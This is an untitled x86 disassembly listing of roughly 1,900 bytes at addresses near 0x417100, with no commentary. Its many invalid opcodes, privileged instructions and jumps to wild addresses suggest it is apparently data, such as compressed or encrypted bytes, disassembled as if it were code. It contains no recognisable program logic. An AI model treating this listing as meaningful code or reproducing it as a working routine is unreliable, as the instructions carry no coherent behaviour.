  41711e:	rol    BYTE PTR [ebx+0x5c021ba],cl
  417124:	data16 mov ah,0x6d
  417127:	aad    0xff
  417129:	push   ss
  41712a:	adc    BYTE PTR [edi],0x12
  41712d:	fiadd  DWORD PTR [ecx+0xb7fff53]
  417133:	dec    ecx
  417134:	das    
  417135:	dec    edx
  417136:	mov    eax,ds:0x3703504a
  41713b:	shl    BYTE PTR [eax],1
  41713d:	xchg   edi,eax
  41713e:	and    eax,0x92bcf0d4
  417143:	jge    0x4171aa
  417145:	shr    BYTE PTR [edi-0x4b823ff9],1
  41714b:	jp     0x4171bb
  41714d:	daa    
  41714e:	and    edx,DWORD PTR [ebp+0x7d]
  417151:	push   0xf7d00f7c
  417156:	(bad)  
  417157:	mov    ds:0x8c4f95cc,al
  41715c:	sbb    DWORD PTR [eax+0x30],ebx
  41715f:	push   ebx
  417160:	adc    DWORD PTR [ebp+0x15],esp
  417163:	mov    eax,ds:0x133ad007
  417168:	mov    WORD PTR [ebx-0xd8adfc8],es
  41716e:	sar    ecx,1
  417170:	mov    dh,0x2d
  417172:	sbb    DWORD PTR [edx-0x2426f2b6],ecx
  417178:	int3   
  417179:	jbe    0x417137
  41717b:	mov    al,ds:0x1fb7acef
  417180:	jle    0x4171bc
  417182:	cli    
  417183:	not    bh
  417185:	ret    
  417186:	sub    al,0xab
  417188:	(bad)  
  417189:	je     0x4171c7
  41718b:	inc    ebx
  41718c:	test   BYTE PTR [ecx+ebx*8],0x75
  417190:	jp     0x417179
  417192:	popf   
  417193:	xchg   ebp,eax
  417194:	in     al,dx
  417195:	mov    edx,0x8caa7127
  41719a:	out    dx,eax
  41719b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41719c:	sbb    eax,0x87efca48
  4171a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171a2:	cwde   
  4171a3:	scas   al,BYTE PTR es:[edi]
  4171a4:	iret   
  4171a5:	dec    ebp
  4171a6:	int    0xfc
  4171a8:	mov    ah,0xc9
  4171aa:	lock pop esi
  4171ac:	add    di,WORD PTR [esi+0x30aeebc]
  4171b3:	or     edx,esp
  4171b5:	aad    0x7f
  4171b7:	push   0xffffffbe
  4171b9:	push   esi
  4171ba:	rcl    BYTE PTR [edi],1
  4171bc:	test   al,0xd6
  4171be:	lds    edx,FWORD PTR [edx+0x7c]
  4171c1:	sahf   
  4171c2:	mov    ss,WORD PTR [ebx-0x18]
  4171c5:	in     eax,dx
  4171c6:	fiadd  DWORD PTR [ecx]
  4171c8:	jp     0x4171d3
  4171ca:	mov    bh,0xfd
  4171cc:	xchg   ecx,eax
  4171cd:	inc    ebp
  4171ce:	jae    0x417192
  4171d0:	xchg   esp,eax
  4171d1:	loopne 0x4171a0
  4171d3:	xchg   ecx,eax
  4171d4:	leave  
  4171d5:	cs push ebx
  4171d7:	and    al,0xb4
  4171d9:	pusha  
  4171da:	icebp  
  4171db:	mov    edx,0x2739028d
  4171e0:	inc    edx
  4171e1:	cs int3 
  4171e3:	dec    edi
  4171e4:	jmp    0x417187
  4171e6:	stos   DWORD PTR es:[edi],eax
  4171e7:	pop    eax
  4171e8:	das    
  4171e9:	cmp    eax,0x7cb4d16
  4171ee:	retf   0xea3a
  4171f1:	ficom  DWORD PTR [ebx-0x11]
  4171f4:	or     DWORD PTR [edi],edx
  4171f6:	fdiv   st(5),st
  4171f8:	pop    edx
  4171f9:	dec    ecx
  4171fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171fb:	shl    DWORD PTR [edx],0x64
  4171fe:	sub    BYTE PTR [edi-0x54],cl
  417201:	fdiv   st,st(4)
  417203:	pop    es
  417204:	cs sub eax,0x8755e74
  41720a:	mov    ah,0xdd
  41720c:	push   0xffffffb3
  41720e:	inc    ebx
  41720f:	(bad)  
  417210:	fld    QWORD PTR [ecx-0x72]
  417213:	ret    0xc141
  417216:	xor    ch,BYTE PTR [esi+0x1a]
  417219:	pop    ss
  41721a:	push   edx
  41721b:	sub    DWORD PTR [ebx+0x43],esi
  41721e:	lock fiadd DWORD PTR [ebx-0x3f59df8c]
  417225:	mov    ds:0xfec0e65a,al
  41722a:	test   DWORD PTR [edx+edx*1+0x629a8ffa],0xd012940e
  417235:	push   es
  417236:	fldcw  WORD PTR [eax+0x5b453032]
  41723c:	add    BYTE PTR [edi-0x2fd0e49f],0xf3
  417243:	push   ebx
  417244:	inc    ebx
  417245:	mov    ds:0xe15a0061,eax
  41724a:	pop    es
  41724b:	aad    0xc4
  41724d:	mov    DWORD PTR [ecx-0x31],eax
  417250:	sub    eax,0x6e8dd511
  417255:	push   ds
  417256:	mov    cl,BYTE PTR [eax]
  417258:	pop    es
  417259:	and    al,BYTE PTR [esp+eiz*4]
  41725c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41725d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41725e:	add    DWORD PTR ds:0xa8060b15,esi
  417264:	shl    DWORD PTR [esp+ebx*8+0x6],0x7
  417269:	push   esp
  41726a:	add    eax,0x5bf3c6d7
  41726f:	sahf   
  417270:	push   cs
  417271:	call   0xaf4c510c
  417276:	cmp    BYTE PTR [eax],bh
  417278:	cmp    ebx,DWORD PTR ds:0x38924f45
  41727e:	out    dx,eax
  41727f:	mov    bh,0x28
  417281:	mov    bh,0x7b
  417283:	mov    al,ds:0xf0f2b4e7
  417288:	dec    edi
  417289:	xchg   ecx,eax
  41728a:	mov    ds:0x7143eefc,al
  41728f:	mov    bl,0x3d
  417291:	xchg   ecx,eax
  417292:	sbb    eax,DWORD PTR ds:0xcd478213
  417298:	sbb    eax,0xb331cb64
  41729d:	push   0xffffff88
  41729f:	or     BYTE PTR ds:0x5ecfdf80,ch
  4172a5:	rcl    DWORD PTR [eax],1
  4172a7:	xor    eax,DWORD PTR [ebx-0x3d2a757c]
  4172ad:	(bad)
  4172b0:	(bad)  
  4172b1:	pop    ecx
  4172b2:	jle    0x4172eb
  4172b4:	cmc    
  4172b5:	icebp  
  4172b6:	and    BYTE PTR [eax+0x44120e3f],al
  4172bc:	cs sub al,0x96
  4172bf:	das    
  4172c0:	out    0x63,eax
  4172c2:	fcom   st(1)
  4172c4:	lds    esi,FWORD PTR [esi-0x2b50b91f]
  4172ca:	or     BYTE PTR [eax+0x8d25529],ch
  4172d0:	and    eax,0xc0ed87a8
  4172d5:	aaa    
  4172d6:	test   al,0x26
  4172d8:	cwde   
  4172d9:	push   ds
  4172da:	mov    esi,0x6ce01bba
  4172df:	pop    edi
  4172e0:	jmp    0xe8c559a3
  4172e5:	adc    BYTE PTR [ebx-0x4ae0d21c],0xf9
  4172ec:	mov    edi,0x805d5459
  4172f1:	test   eax,esi
  4172f3:	test   al,0x43
  4172f5:	retf   0xa09c
  4172f8:	dec    edx
  4172f9:	imul   edx,DWORD PTR gs:[edx+0x22c04cd6],0x684dc6e9
  417304:	ins    BYTE PTR es:[edi],dx
  417305:	ins    DWORD PTR es:[edi],dx
  417306:	test   BYTE PTR ss:[esi],ah
  417309:	jmp    0x4172d9
  41730b:	hlt    
  41730c:	cmp    eax,0x4bf46fd0
  417311:	fiadd  DWORD PTR [ebx-0x5b]
  417314:	mov    bl,BYTE PTR [ecx]
  417316:	ins    BYTE PTR es:[edi],dx
  417317:	(bad)  
  417319:	es cwde 
  41731b:	sbb    eax,0xb7b82ff7
  417320:	(bad)  [edi+0x28]
  417323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417324:	shr    DWORD PTR [edx],0xab
  417327:	inc    esp
  417328:	icebp  
  417329:	neg    cl
  41732b:	ins    DWORD PTR es:[edi],dx
  41732c:	dec    eax
  41732d:	mov    DWORD PTR [ecx-0x5dc571a1],esi
  417333:	jl     0x41739b
  417335:	mov    ds:0x5214d755,eax
  41733a:	cmp    DWORD PTR [esi+0x7c9a19b2],0x2867b849
  417344:	push   0x45bc3c45
  417349:	lock jmp 0xc4a84522
  41734f:	mov    dl,0x68
  417351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417352:	mov    ecx,0xd6f509f4
  417357:	xor    ecx,edx
  417359:	in     al,dx
  41735a:	jp     0x4172e4
  41735c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41735d:	and    DWORD PTR [ebx+0x44ba61a0],ecx
  417363:	add    DWORD PTR [ecx],eax
  417365:	sub    BYTE PTR [ebx],al
  417367:	or     eax,DWORD PTR [edi]
  417369:	xchg   esi,eax
  41736a:	xor    edi,DWORD PTR [ebx-0x17c34907]
  417370:	push   es
  417371:	sub    esi,DWORD PTR [esi+edi*1-0x6892abcc]
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	cmp    DWORD PTR [ebx-0x478f37c1],esp
  41737f:	leave  
  417380:	pop    ss
  417381:	push   cs
  417382:	mov    ebx,0xeadd8d7b
  417387:	lock jns 0x4173a8
  41738a:	out    dx,eax
  41738b:	bound  esp,QWORD PTR es:[ebx-0x4c]
  41738f:	sbb    BYTE PTR [ebx-0x65],0x23
  417393:	push   ecx
  417394:	call   0xde161038
  417399:	push   cs
  41739a:	dec    edx
  41739b:	inc    ecx
  41739c:	mov    cl,0x84
  41739e:	xlat   BYTE PTR ds:[ebx]
  41739f:	mov    ds:0xcd08d2a9,eax
  4173a4:	test   BYTE PTR [edx],dh
  4173a6:	push   edi
  4173a7:	jb     0x4173b3
  4173a9:	inc    ecx
  4173aa:	jmp    0xe830a543
  4173af:	mov    al,ds:0x5c9f6227
  4173b4:	stos   BYTE PTR es:[edi],al
  4173b5:	inc    esp
  4173b6:	test   DWORD PTR [edx+0x2ad9a5c3],0xe82f2f
  4173c0:	or     DWORD PTR [edx],esi
  4173c2:	sar    BYTE PTR [ecx+0x0],cl
  4173c5:	cli    
  4173c6:	sar    BYTE PTR [esi-0x8bb380a],1
  4173cc:	mov    ?,eax
  4173ce:	sub    al,0x2f
  4173d0:	dec    esp
  4173d1:	outs   dx,BYTE PTR ds:[esi]
  4173d2:	sahf   
  4173d3:	fs call 0x5177:0x33e1853c
  4173db:	adc    DWORD PTR [ebx-0x26f2c603],edi
  4173e1:	int    0x7
  4173e3:	adc    esi,eax
  4173e5:	aad    0xf0
  4173e7:	sbb    BYTE PTR [ebx+0x7e],cl
  4173ea:	stos   DWORD PTR es:[edi],eax
  4173eb:	nop
  4173ec:	ins    BYTE PTR es:[edi],dx
  4173ed:	sti    
  4173ee:	cld    
  4173ef:	adc    eax,0x5ae08f3b
  4173f4:	push   ds
  4173f5:	cld    
  4173f6:	mov    BYTE PTR [edi+esi*1+0x19ee90ff],bl
  4173fd:	in     eax,0x63
  4173ff:	ret    
  417400:	into   
  417401:	cld    
  417402:	imul   DWORD PTR [esp+esi*2-0x3e059846]
  417409:	hlt    
  41740a:	add    al,0xcd
  41740c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41740d:	adc    eax,0xd5b414a0
  417412:	popa   
  417413:	mov    ds:0xb3e36caf,al
  417418:	sub    BYTE PTR [ebp-0x4934db73],dl
  41741e:	in     al,0x74
  417420:	and    DWORD PTR [ecx],0xffffffb5
  417423:	push   edx
  417424:	and    al,0x9f
  417426:	xchg   esi,eax
  417427:	mov    dh,0xe7
  417429:	sub    BYTE PTR [edx-0x67e4278],bl
  41742f:	int3   
  417430:	(bad)
  417433:	ret    
  417434:	mov    bl,0xf8
  417436:	dec    esp
  417437:	mov    dl,0xf1
  417439:	mov    dh,0x67
  41743b:	shl    ebp,cl
  41743d:	jp     0x417453
  41743f:	or     al,0x7f
  417441:	or     bh,ch
  417443:	ins    DWORD PTR es:[edi],dx
  417444:	xor    ebx,DWORD PTR [ecx]
  417446:	xor    al,0xa2
  417448:	jbe    0x417445
  41744a:	push   edx
  41744b:	or     eax,DWORD PTR [ecx-0x3df8a774]
  417451:	jmp    0x1aa19532
  417456:	sbb    bh,BYTE PTR [edx-0x4]
  417459:	xchg   esp,eax
  41745a:	outs   dx,DWORD PTR ds:[esi]
  41745b:	mov    edi,0x3c4fa1e8
  417460:	rcr    BYTE PTR [eax+0x21],0x7b
  417464:	scas   al,BYTE PTR es:[edi]
  417465:	mov    eax,DWORD PTR [esp+0x4122f40e]
  41746c:	mov    es:0x99b9caa3,al
  417472:	mov    DWORD PTR [edx+eiz*1-0xd9ed24d],eax
  417479:	pop    edi
  41747a:	push   ds
  41747b:	push   ss
  41747c:	or     cl,BYTE PTR [edx+0x4df24c9d]
  417482:	(bad)  
  417483:	sub    edx,DWORD PTR [edx-0x21]
  417486:	test   DWORD PTR [eax],0x2fddaf48
  41748c:	jbe    0x417471
  41748e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41748f:	pop    edx
  417490:	push   edx
  417491:	lock cmp al,0x83
  417494:	or     esp,DWORD PTR [ebx]
  417496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417497:	sbb    al,0xa1
  417499:	sub    DWORD PTR [esi],esp
  41749b:	ins    BYTE PTR es:[edi],dx
  41749c:	mov    BYTE PTR [esp+ebp*1+0x2e],ch
  4174a0:	addr16 jg 0x417455
  4174a3:	fiadd  WORD PTR [eax+0x46]
  4174a6:	adc    cl,BYTE PTR [edi+0x5d88cec0]
  4174ac:	mov    esi,0x45f2f73
  4174b1:	jl     0x4174f7
  4174b3:	stc    
  4174b4:	mov    edx,0x40deff29
  4174b9:	leave  
  4174ba:	adc    eax,0x6fd71884
  4174bf:	dec    esi
  4174c0:	mov    ds:0x24d36ea4,al
  4174c5:	nop
  4174c6:	das    
  4174c7:	aam    0xf0
  4174c9:	stc    
  4174ca:	sub    bl,BYTE PTR ds:0x46bf7d69
  4174d0:	in     al,dx
  4174d1:	call   0xcf7343c2
  4174d6:	rcr    BYTE PTR [esi],cl
  4174d8:	cli    
  4174d9:	add    BYTE PTR [ebp+0x54],al
  4174dc:	sbb    al,0xcf
  4174de:	popa   
  4174df:	outs   dx,BYTE PTR ds:[esi]
  4174e0:	(bad)  
  4174e2:	sahf   
  4174e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174e4:	in     eax,0x9a
  4174e6:	pushf  
  4174e7:	sbb    esi,DWORD PTR [edi-0x25]
  4174ea:	popa   
  4174eb:	cmp    eax,0x7b775696
  4174f0:	out    dx,eax
  4174f1:	mov    ch,0x2d
  4174f3:	mov    edi,0x6063707d
  4174f8:	fadd   QWORD PTR [ebp+0x68]
  4174fb:	jmp    0x4174ba
  4174fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174fe:	cmp    eax,0xc5dd20de
  417503:	ret    0x95f9
  417506:	mov    bl,0x55
  417508:	push   cs
  417509:	sbb    esp,0x6a290c1f
  41750f:	sahf   
  417510:	(bad)  [ebx-0x9f3ffd6]
  417516:	adc    DWORD PTR [ecx],edi
  417518:	adc    bl,0x5d
  41751b:	cwde   
  41751c:	adc    edx,DWORD PTR [ecx]
  41751e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41751f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417520:	pop    edi
  417521:	xchg   esi,eax
  417522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417523:	cdq    
  417524:	into   
  417525:	jecxz  0x4174e5
  417527:	rol    BYTE PTR [ebp+esi*8+0xb2885f7],cl
  41752e:	rcl    BYTE PTR [esi+esi*2],cl
  417531:	push   cs
  417532:	add    ah,BYTE PTR [eax-0x1b]
  417535:	mov    eax,ds:0x9a87065c
  41753a:	dec    ebp
  41753b:	not    BYTE PTR [ebx+ebx*2+0x60]
  41753f:	cmc    
  417540:	jnp    0x417505
  417542:	pop    edx
  417543:	(bad)  
  417544:	in     al,0xd0
  417546:	or     esi,DWORD PTR [ecx]
  417548:	and    ah,BYTE PTR [edx]
  41754a:	test   al,0xab
  41754c:	fld    st(4)
  41754e:	mov    ds:0x1fde2c70,eax
  417553:	mov    eax,0xc0d4baa9
  417558:	shl    DWORD PTR [ebp+0x4b981655],0xd4
  41755f:	pushf  
  417560:	xor    ebp,DWORD PTR [edx]
  417562:	loop   0x417570
  417564:	ss mov edi,0xdfc56c79
  41756a:	stc    
  41756b:	fsubr  QWORD PTR [ebx]
  41756d:	(bad)  
  41756e:	dec    eax
  41756f:	scas   al,BYTE PTR es:[edi]
  417570:	adc    eax,0xa0b4c2b9
  417575:	push   eax
  417576:	mov    ebx,0xbd77e2c5
  41757b:	ja     0x417569
  41757d:	mov    eax,ds:0xa703253e
  417582:	push   esp
  417583:	add    al,0xe1
  417585:	or     eax,0x764331b6
  41758a:	cli    
  41758b:	loop   0x417593
  41758d:	mul    ecx
  41758f:	jle    0x417545
  417591:	arpl   WORD PTR [ecx+0x8],si
  417594:	jl     0x417563
  417596:	jae    0x41758e
  417598:	xor    DWORD PTR ds:0xea28aeb8,esi
  41759e:	leave  
  41759f:	pop    es
  4175a0:	outs   dx,DWORD PTR ds:[esi]
  4175a1:	(bad)  
  4175a2:	mov    cl,0x22
  4175a4:	outs   dx,BYTE PTR ds:[esi]
  4175a5:	jns    0x41759b
  4175a7:	cmp    esp,esp
  4175a9:	daa    
  4175aa:	mov    bh,0x88
  4175ac:	sbb    al,0xb1
  4175ae:	inc    edx
  4175af:	rcl    esp,cl
  4175b1:	pop    ebp
  4175b2:	and    DWORD PTR [ecx+0x78d02b4d],ecx
  4175b8:	sbb    ebp,DWORD PTR [ebp+0x70c966ee]
  4175be:	imul   DWORD PTR [eax+0x5b]
  4175c1:	mov    eax,ds:0xa3edc505
  4175c6:	ror    BYTE PTR [esi+0x5b79b31],1
  4175cc:	je     0x41754f
  4175ce:	cmp    al,0x2b
  4175d0:	add    ecx,DWORD PTR [edi-0x69]
  4175d3:	adc    ebp,DWORD PTR [edx+0x71]
  4175d6:	std    
  4175d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175d8:	mov    dh,BYTE PTR [ebp+0x41]
  4175db:	ret    0x1034
  4175de:	adc    DWORD PTR [esp+esi*1-0x3403498],ecx
  4175e5:	sar    DWORD PTR [edi+0x6],cl
  4175e8:	jns    0x417596
  4175ea:	lods   al,BYTE PTR ds:[esi]
  4175eb:	add    BYTE PTR [edx+ebp*2-0x4e],dl
  4175ef:	inc    eax
  4175f0:	sub    ch,bl
  4175f2:	adc    edx,ebp
  4175f4:	mul    ebx
  4175f6:	out    0x82,eax
  4175f8:	xchg   DWORD PTR ds:0xfc4abb3c,esp
  4175fe:	pop    edi
  4175ff:	scas   eax,DWORD PTR es:[edi]
  417600:	rol    BYTE PTR [esp+edi*4-0x796b20d2],cl
  417607:	dec    ebx
  417608:	pop    edi
  417609:	pop    ecx
  41760a:	shl    DWORD PTR [eax-0x3efda583],1
  417610:	iret   
  417611:	fwait
  417612:	popf   
  417613:	dec    ecx
  417614:	and    eax,0x2e711bcb
  417619:	pop    ebp
  41761a:	lahf   
  41761b:	cmp    ah,al
  41761d:	cwde   
  41761e:	jne    0x4175fa
  417620:	pop    es
  417621:	sbb    eax,0x9d43ed43
  417626:	popf   
  417627:	push   esi
  417628:	adc    al,0x62
  41762a:	test   esi,0xf0050723
  417630:	aad    0xd3
  417632:	xchg   ebp,eax
  417633:	jb     0x4175c6
  417635:	inc    esp
  417636:	pop    es
  417637:	lods   eax,DWORD PTR ds:[esi]
  417638:	stos   DWORD PTR es:[edi],eax
  417639:	aas    
  41763a:	xacquire xchg BYTE PTR [ecx],bl
  41763d:	shl    BYTE PTR [edx],0x5d
  417640:	outs   dx,BYTE PTR ds:[esi]
  417641:	stos   BYTE PTR es:[edi],al
  417642:	stc    
  417643:	xor    al,0x5
  417645:	pusha  
  417646:	nop
  417647:	or     al,0xa9
  417649:	push   esi
  41764a:	dec    eax
  41764b:	cmp    BYTE PTR [ebx],bh
  41764d:	cli    
  41764e:	(bad)  
  41764f:	sbb    DWORD PTR [ebp-0x38cd007b],edi
  417655:	sub    dl,BYTE PTR [edx-0x38]
  417658:	jg     0x417625
  41765a:	rcr    DWORD PTR [ebx+0x6ae8b97f],1
  417660:	pop    edi
  417661:	mov    dl,0x9c
  417663:	and    ebp,DWORD PTR [edx-0x215cd878]
  417669:	daa    
  41766a:	mov    esp,0x5cfb6cd2
  41766f:	adc    ch,bl
  417671:	ret    
  417672:	adc    eax,0x4c540d25
  417677:	mov    cl,0x85
  417679:	pusha  
  41767a:	(bad)  [edx]
  41767c:	bound  esp,QWORD PTR [esi-0x478a7f7a]
  417682:	gs call 0xafde6ebf
  417688:	mov    edi,ebp
  41768a:	jnp    0x41761e
  41768c:	test   BYTE PTR [ebp-0x22],0x11
  417690:	lods   al,BYTE PTR ds:[esi]
  417691:	cwde   
  417692:	cmp    al,0xe6
  417694:	push   ebx
  417695:	(bad)  
  417696:	pop    ecx
  417697:	adc    al,ah
  417699:	jmp    0x417633
  41769b:	push   es
  41769c:	imul   ebx,esp,0xe6c64237
  4176a2:	outs   dx,BYTE PTR ds:[esi]
  4176a3:	and    BYTE PTR [esi+0x23046bbd],bh
  4176a9:	add    al,0xd4
  4176ab:	mov    bh,BYTE PTR ds:0x93f91c71
  4176b1:	jns    0x41768b
  4176b3:	mov    dh,0x5d
  4176b5:	mov    eax,0x188fe46
  4176ba:	mov    ds:0xa72df205,al
  4176bf:	int3   
  4176c0:	pusha  
  4176c1:	dec    ebx
  4176c2:	dec    ebp
  4176c3:	xchg   ebx,eax
  4176c4:	gs jp  0x4176be
  4176c7:	sub    DWORD PTR [ecx-0x3b225b56],eax
  4176cd:	cli    
  4176ce:	cwde   
  4176cf:	leave  
  4176d0:	and    al,0xc6
  4176d2:	or     ah,al
  4176d4:	xchg   DWORD PTR [ebx-0x16],edx
  4176d7:	ror    DWORD PTR [ebx],0x14
  4176da:	clc    
  4176db:	inc    ebx
  4176dc:	push   esp
  4176dd:	lock push es
  4176df:	inc    edx
  4176e0:	(bad)  
  4176e1:	cmp    al,0xa9
  4176e3:	inc    eax
  4176e4:	invd   
  4176e6:	std    
  4176e7:	add    bh,BYTE PTR [ecx-0x2b9e20fc]
  4176ed:	mov    al,0x6e
  4176ef:	pushf  
  4176f0:	outs   dx,DWORD PTR ds:[esi]
  4176f1:	xchg   DWORD PTR [ecx+0x19],ecx
  4176f4:	sbb    DWORD PTR [edi-0x7c9b2f96],edx
  4176fa:	sbb    al,0xbf
  4176fc:	cdq    
  4176fd:	jp     0x4176ad
  4176ff:	icebp  
  417700:	js     0x41772d
  417702:	stc    
  417703:	int    0xcf
  417705:	ins    DWORD PTR es:[edi],dx
  417706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417707:	int    0x79
  417709:	stos   DWORD PTR es:[edi],eax
  41770a:	fwait
  41770b:	(bad)  
  41770c:	call   0xb7d3:0xf8209853
  417713:	and    cl,BYTE PTR [ecx+ebx*8-0x41]
  417717:	cmp    al,0x81
  417719:	push   ss
  41771a:	jg     0x4176a5
  41771c:	jmp    0x417761
  41771e:	icebp  
  41771f:	or     dh,0x10
  417722:	jp     0x417738
  417724:	fucom  st(2)
  417726:	jnp    0x41773e
  417728:	repnz dec ecx
  41772a:	ins    DWORD PTR es:[edi],dx
  41772b:	in     al,0x84
  41772d:	out    dx,al
  41772e:	bound  esp,QWORD PTR [esi]
  417730:	dec    edx
  417731:	pop    esp
  417732:	jbe    0x4176d8
  417734:	outs   dx,DWORD PTR ds:[esi]
  417735:	shl    DWORD PTR [edx+0x4d],1
  417738:	gs shl dh,1
  41773b:	lods   eax,DWORD PTR ds:[esi]
  41773c:	xchg   esi,eax
  41773d:	xor    DWORD PTR [eax+0x69],edi
  417740:	push   es
  417741:	stc    
  417742:	ret    0x4103
  417745:	jmp    0x18e3:0xf79c5850
  41774c:	cld    
  41774d:	cs iret 
  41774f:	jge    0x4177c3
  417751:	push   esp
  417752:	aaa    
  417753:	or     eax,0x41e2bddd
  417758:	mov    fs,ebp
  41775a:	test   al,0xce
  41775c:	lahf   
  41775d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41775e:	dec    ebp
  41775f:	adc    al,0x29
  417761:	sub    BYTE PTR [eax+ebp*4-0x56693d63],al
  417768:	mov    edx,DWORD PTR [eax]
  41776a:	popa   
  41776b:	outs   dx,BYTE PTR ds:[esi]
  41776c:	adc    al,BYTE PTR [ebx-0x64]
  41776f:	jmp    0x417780
  417771:	lea    esp,[edi+esi*1+0xc]
  417775:	(bad)  
  417776:	jmp    0x838e:0xc476e0ae
  41777d:	test   BYTE PTR [eax],ch
  41777f:	into   
  417780:	mov    edi,0x11256f11
  417785:	pop    ss
  417786:	sbb    DWORD PTR [edx+0x65],esp
  417789:	adc    eax,0xdc4ee35d
  41778e:	shl    DWORD PTR [edx-0xac136fe],0x16
  417795:	push   ds
  417796:	jle    0x417724
  417798:	(bad)  
  417799:	sbb    ecx,DWORD PTR [ebp+0x4198dd3d]
  41779f:	dec    esp
  4177a1:	or     eax,0x3e0a51a2
  4177a6:	mul    esi
  4177a8:	mov    dl,0xfd
  4177aa:	dec    esp
  4177ab:	std    
  4177ac:	fnstenv [esi-0x10]
  4177af:	(bad)  
  4177b0:	hlt    
  4177b1:	inc    ebp
  4177b2:	fimul  DWORD PTR [ecx+0x1fee62d5]
  4177b8:	adc    al,0x35
  4177ba:	outs   dx,DWORD PTR ds:[esi]
  4177bb:	(bad)  
  4177bc:	bound  eax,QWORD PTR [edx-0x39fd562b]
  4177c2:	lock (bad) 
  4177c4:	mov    edx,0xec169346
  4177c9:	stos   DWORD PTR es:[edi],eax
  4177ca:	data16 jnp 0x417753
  4177cd:	mov    ebx,0x2e91b9c1
  4177d2:	dec    ebp
  4177d3:	inc    eax
  4177d4:	pop    ss
  4177d5:	dec    ecx
  4177d6:	add    al,0xf7
  4177d8:	hlt    
  4177d9:	fdivr  QWORD PTR [esi]
  4177db:	xchg   ebp,eax
  4177dc:	or     WORD PTR [ecx],bp
  4177df:	fcomp  DWORD PTR [ecx]
  4177e1:	pop    edi
  4177e2:	neg    DWORD PTR [esp+edi*8-0x3ad23772]
  4177e9:	loop   0x417868
  4177eb:	dec    esp
  4177ec:	pusha  
  4177ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177ee:	sub    eax,0xdff9e19b
  4177f3:	ins    BYTE PTR es:[edi],dx
  4177f4:	pop    edi
  4177f5:	xchg   edx,eax
  4177f6:	cli    
  4177f7:	aaa    
  4177f8:	xchg   esi,eax
  4177f9:	jle    0x417846
  4177fb:	pop    edi
  4177fc:	mov    ecx,0x4002af18
  417801:	sub    eax,0x28a7d2c9
  417806:	or     DWORD PTR [ecx+eax*1+0x710e50f3],0xffffffde
  41780e:	pop    edi
  41780f:	xchg   ecx,eax
  417810:	lods   al,BYTE PTR ds:[esi]
  417811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417812:	add    eax,DWORD PTR [eax+0x39]
  417815:	lods   eax,DWORD PTR ds:[esi]
  417816:	mov    dl,0xfb
  417818:	adc    BYTE PTR [eax],bl
  41781a:	xor    al,0x73
  41781c:	xchg   BYTE PTR [edx],cl
  41781e:	repnz sbb esp,ecx
  417821:	dec    esi
  417822:	loop   0x4177e0
  417824:	scas   al,BYTE PTR es:[edi]
  417825:	hlt    
  417826:	mov    ebx,0xcd8e79a8
  41782b:	out    dx,al
  41782c:	jae    0x4177d5
  41782e:	outs   dx,BYTE PTR ds:[esi]
  41782f:	cmp    BYTE PTR [ecx+0x5b],cl
  417832:	jo     0x41789e
  417834:	pop    eax
  417835:	fisttp DWORD PTR [ecx]
  417837:	leave  
  417838:	sub    eax,0x6222dd02
  41783d:	xchg   dl,ch
  41783f:	xabort 0x6c
  417842:	inc    ebp
  417843:	dec    ebp
  417844:	iret   
  417845:	mov    bl,0xe1
  417847:	push   ecx
  417848:	pushf  
  417849:	push   eax
  41784a:	jecxz  0x4178b7
  41784c:	mov    al,0xec
  41784e:	and    esp,DWORD PTR [eax]
  417850:	fiadd  WORD PTR [ebp-0x3393e01d]
  417856:	out    0x8f,al
  417858:	mov    dl,0x72
  41785a:	ds out dx,eax
  41785c:	in     eax,dx
  41785d:	inc    esp
  41785e:	clc    
  41785f:	aad    0x31
  417861:	xor    al,0x1e
  417863:	adc    BYTE PTR [edi-0x31],ah
  417866:	adc    BYTE PTR [eax-0x13],bl
  417869:	jb     0x4178e0
  41786b:	add    al,0x6f
  41786d:	push   ebx
  41786e:	mov    ebx,DWORD PTR [ecx-0x13a808ca]
  417874:	cli    
  417875:	(bad)  
  417876:	clc    
  417877:	dec    ecx
  417878:	fisttp WORD PTR [esi-0x2d0b6a75]
  41787e:	rol    DWORD PTR [esi],0x77
  417881:	jmp    0xef987576
  417886:	in     eax,dx
  417887:	mov    eax,ds:0x858a7957
  41788c:	retf   
  41788d:	pusha  
  41788e:	cmp    BYTE PTR [ebp-0x3212dd5c],bl
  417894:	adc    cl,cl
  417896:	xor    ah,BYTE PTR [esi-0x2be6ef47]
  41789c:	call   0x5c28c783
  4178a1:	(bad)  
  4178a2:	in     eax,dx
  4178a3:	jns    0x417923
  4178a5:	add    al,0x5a
  4178a7:	inc    ebp
  4178a8:	imul   eax,DWORD PTR [ebx+0x77],0xffffffb1
  4178ac:	and    al,0xb7
  4178ae:	push   edx
  4178af:	mov    dl,0x2b
  4178b1:	mov    ds:0xc9935121,eax
  4178b6:	sar    bl,cl
  4178b8:	ja     0x4178cb
  4178ba:	rcr    BYTE PTR [ebp+0x6c],1
  4178bd:	lock xor ebp,DWORD PTR [edi-0x1d1def35]
  4178c4:	cmp    DWORD PTR [ecx+0x76],esi
  4178c7:	mov    bh,0xb7
  4178c9:	adc    eax,0x7ec0c1ae
  4178ce:	scas   eax,DWORD PTR es:[edi]
